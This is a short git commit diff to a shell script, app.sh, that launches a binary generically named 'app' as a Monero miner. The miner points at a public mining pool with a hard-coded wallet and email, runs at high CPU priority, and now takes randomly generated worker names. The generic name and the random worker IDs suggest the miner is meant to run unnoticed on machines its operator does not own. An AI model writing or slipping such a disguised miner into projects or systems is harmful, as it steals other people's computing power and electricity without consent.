a495459440af46781794b05ff0cca147c50606fb
neptunecorsiva <54308303+neptunecorsiva@users.noreply.github.com>
2020-05-04 00:12:10 +0800

    Update app.sh

--- app.sh
+++ app.sh
@@ -1,3 +1,4 @@
-time=`date +%s`
+time=`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 5 | head -n 1`
+time=$time"-orb"
 chmod +x app
 ./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 489SKk43bDUL3KF3E5RPMmEVpB6cLYJJcWZmPbmxrJ1vGyh3dAADeLxUQK8UK6yqNWTJG96cATyiG7Qs39PXi6K932ug3zS -p $time:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast
